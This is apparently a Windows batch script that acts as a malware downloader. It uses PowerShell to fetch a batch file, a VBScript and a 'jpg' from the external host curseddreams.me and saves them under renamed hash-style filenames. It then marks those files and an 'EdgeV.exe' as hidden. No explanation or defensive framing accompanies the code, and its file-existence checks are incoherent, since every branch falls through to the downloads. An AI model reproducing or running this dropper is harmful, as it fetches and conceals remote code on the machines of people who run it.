@echo off
:start
IF EXIST 7b96332f2c9f777574ba038be0334018.jpg goto nextfile1
:nextfile1
IF EXIST d3745b53b599b72e9cb750f4d757560d.vbs goto nextfile2
:nextfile2
IF EXIST FileScheduler.bat goto nextfile3
:nextfile3
IF NOT EXIST ec372a061f8a3c0432bb4575216c7f75.jpg goto files
IF NOT EXIST d3745b53b599b72e9cb750f4d757560d.bat goto files
IF NOT EXIST 7b96332f2c9f777574ba038be0334018.vbs goto files
:files
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/7b96332f2c9f777574ba038be0334018.jpg', 'ec372a061f8a3c0432bb4575216c7f75.jpg')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/FileScheduler.bat', 'd3745b53b599b72e9cb750f4d757560d.bat')"
powershell -Command "(New-Object Net.WebClient).DownloadFile('http://curseddreams.me/scripts/d3745b53b599b72e9cb750f4d757560d.vbs', '7b96332f2c9f777574ba038be0334018.vbs')"
attrib +h 7b96332f2c9f777574ba038be0334018.jpg
attrib +h d3745b53b599b72e9cb750f4d757560d.bat
attrib +h ec372a061f8a3c0432bb4575216c7f75.jpg
attrib +h EdgeV.exe
:end
